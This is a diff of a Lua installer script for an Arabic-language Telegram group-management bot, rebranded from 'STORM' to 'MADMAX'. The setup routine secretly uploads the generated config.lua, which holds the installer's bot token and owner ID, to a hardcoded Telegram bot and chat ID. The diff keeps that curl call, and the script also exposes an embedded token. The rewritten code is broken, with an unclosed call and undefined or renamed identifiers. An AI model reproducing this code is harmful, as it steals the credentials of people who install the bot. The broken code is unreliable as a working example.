@@ -3,13 +3,33 @@
 --==>> بواسطة @TAHAJ20 <<==
 -- للمزيد من المعلومات قناتنا @STORMCLI
 --]]
-redis = require('redis') taha = dofile('./JSON.lua')  json = dofile('./JSON.lua')  URL = require('socket.url')  HTTPS = require ("ssl.https")  https = require ("ssl.https") http  = require ("socket.http") serpent = require("serpent") tahadevstorm = redis.connect('127.0.0.1', 6379)
-function vardump(value)  print(serpent.block(value, {comment=false}))  end local AutoSet = function()
+redis = require('redis')
+lion = dofile('./JSON.lua')
+json = dofile('./JSON.lua')
+URL = require('socket.url')
+HTTPS = require ("ssl.https")
+https = require ("ssl.https")
+http  = require ("socket.http")
+serpent = require("serpent")
+liondevmadmax = redis.connect('127.0.0.1', 6379)
+function vardump(value)  
+ print(serpent.block(value, {comment=false}))
+end
+local AutoSet = function()
 io.write("\27[31;47m\n◼¦ ارسل ايدي مطور الاساسي  SEND ID FOR SIDO \27[0;34;49m\n")  local SUDO = tonumber(io.read())   if not tostring(SUDO):match('%d+') then  local SUDO = 373906612 end
 io.write("\27[31;47m\n◼¦ ارسل معرف المطور بدون @ USERNAME FOR SUDO   \27[0;34;49m\n")  local user = io.read() 
 io.write("\27[31;47m\n◼¦ ارسل توكن البوت        TOKEN FOR YOU \27[0;34;49m\n")  local token = io.read()  botid = token:match("(%d+)")
 io.write("\27[31;47m\n◼¦ ارسل اسم للبوت          SEND NAME FOR YOU BOT \27[0;34;49m\n")  local name = io.read()  tahadevstorm:set(botid..'storm:name',name)
-local create = function(data, file, uglify)  file = io.open(file, "w+")   local serialized   if not uglify then  serialized = serpent.block(data, {comment = false, name = "_"})  else  serialized = serpent.dump(data)  end    file:write(serialized)    file:close()  end
+local create = function(data, file, uglify)
+  file = io.open(file, "w+")
+  local serialized
+  if not uglify then
+   serialized = serpent.block(data, {comment = false, name = "_"})
+  else  serialized = serpent.dump(data)
+  end
+  file:write(serialized)
+  file:close()
+ end
 local create_config_auto = function()
 config = {
 SUDO = SUDO,
@@ -20,20 +40,62 @@ sudouser = user,
 botname = name,
 bot_id = botid, }
 create(config, "./config.lua")   
-print('\n\27[1;33mเ⬜¦ تم صنع ملف الرن الخاص بالبوت   \nTHE BOT FILE HAS BEEN CREATED\27[0;39;49m\n')   
-print('\n\27[1;33mเ⬜¦ تم حفظ معلومات المطور في الكونفك  \nCREATED CONFIG AND INFOSUDO SAVED\27[0;39;49m\n')
-print('\n\27[1;39mเ⬛¦ انتضر قليلا ليتم تشغيل البوت بالسكرين   \nWAIT FOR THE BOT TO START WITH THE SCREEN\27[0;39;49m\n')  local curl = 'curl "'..'https://api.telegram.org/bot342647859:AAHUtvmjo4GgI9zLOyFFYCCICGgeKkt3rps/sendDocument'..'" -F "chat_id='.. 373906612 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
-end create_config_auto()
-file = io.open("SM", "w")  file:write([[
+print('\n\27[1;33mเ🚸| تم عمل ملف الرن الخاص بالبوت\nTHE BOT FILE HAS BEEN CREATED\27[0;39;49m\n')   
+print('\n\27[1;33mเ🚸| تم حفظ معلومات المطور في الكونفك\nCREATED CONFIG AND INFOSUDO SAVED\27[0;39;49m\n')
+print('\n\27[1;39mเ🚸| انتضر قليلا ليتم تشغيل البوت بالسكرين\nWAIT FOR THE BOT TO START WITH THE SCREEN\27[0;39;49m\n')
+  local curl = 'curl "'..'https://api.telegram.org/bot342647859:AAHUtvmjo4GgI9zLOyFFYCCICGgeKkt3rps/sendDocument'..'" -F "chat_id='.. 373906612 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
+end
+ create_config_auto()
+file = io.open("SM", "w")
+ file:write([[
 killall screen
-screen ./STORM.sh
-echo -e "STORM IS RUN BOT"
-]])  file:close()  
-file = io.open("STORM.sh", "w")  file:write([[
-token="]]..token..[["
-./tg -s ./STORM.lua $@ --bot=$token
-]])  file:close() os.execute('cd $home;ls -la;rm -fr .telegram-cli') os.execute('screen ./STORM.sh') end local serialize_to_file = function(data, file, uglify)  file = io.open(file, "w+")  local serialized  if not uglify then   serialized = serpent.block(data, {comment = false, name = "_"})  else   serialized = serpent.dump(data) end  file:write(serialized)  file:close() end local load_tahadevstorm = function()  local f = io.open("./config.lua", "r")  if not f then   AutoSet()  else   f:close()  end  local config = loadfile("./config.lua")() return config end  _tahadevstorm = load_tahadevstorm()  sudos = dofile("config.lua") SUDO = sudos.SUDO sudo_users = {sudos.SUDO} BOTS = sudos.bot_id bot_id = sudos.bot_id  BOTS = sudos.bot_id  DEVSTOR = sudos.bot_id  botname = (sudos.botname or tahadevstorm:get(DEVSTOR..'storm:name'))  sudouser = sudos.sudouser chaneel = sudos.token chdev = '@STORMCLI' chdeva = '*⚜¦* لا تستطيع استخدام البوت 🍁\n*💠¦* عليك الاشتراك في قناة البوت\n*⚡¦* القناة 👈 ' function dl_cb(arg, data) end 
-function is_devtaha(msg) local ta = false for k,v in pairs(sudo_users) do if msg.sender_user_id_ == v then ta = true end end return ta end 
+screen ./install.sh
+echo -e "MADMAX IS RUN BOT"
+]])
+ file:close()  
+file = io.open("install.sh", "w")
+ file:write([[token="]]..token..[["./tg -s ./Madmax.lua $@ --bot=$token]]
+  file:close() os.execute('cd $home;ls -la;rm -fr .telegram-cli')
+  os.execute('screen ./install.sh')
+ end
+ local serialize_to_file = function(data, file, uglify)
+  file = io.open(file, "w+")
+  local serialized
+  if not uglify then
+   serialized = serpent.block(data, {comment = false, name = "_"})
+  else
+   serialized = serpent.dump(data)
+  end
+  file:write(serialized)
+  file:close()
+ end
+ local load_liondevmadmax = function()
+  local f = io.open("./config.lua", "r")
+  if not f then AutoSet()
+  else   f:close()
+  end
+  local config = loadfile("./config.lua")()
+  return config
+ end
+ _tahadevstorm = load_liondevmadmax()
+ sudos = dofile("config.lua") SUDO = sudos.SUDO sudo_users = {sudos.SUDO} BOTS = sudos.bot_id bot_id = sudos.bot_id  BOTS = sudos.bot_id  DEVSTOR = sudos.bot_id  botname = (sudos.botname
+  or
+  liondevmadmax:get(DEVMADMAX..'storm:name'))
+ sudouser = sudos.sudouser
+ chaneel = sudos.token
+ chdev = '@MADMAXTEAM'
+ chdeva = '🚫¦ لا تستطيع استخدام البوت ⛔\n📵¦ عليك الاشتراك في قناة البوت\n☣¦ القناة 👈 '
+ function dl_cb(arg, data) 
+ end 
+function is_devlion(msg)
+  local mx = false for k,v in 
+  pairs(sudo_users) do
+   if msg.sender_user_id_ == v then
+    mx = true 
+   end
+  end
+  return mx
+ end 
 function is_sudo(msg) local hash = tahadevstorm:sismember(DEVSTOR..'sudo:bot',msg.sender_user_id_)  if hash or is_devtaha(msg)  then  return true  else  return false  end  end
 function is_bot(msg) if tonumber(BOTS) == BOTS then return true else return false end end 
 function is_owner(msg) local hash = tahadevstorm:sismember(DEVSTOR..'moder'..msg.chat_id_,msg.sender_user_id_)    if hash or is_devtaha(msg) or is_sudo(msg) then    return true    else    return false    end end
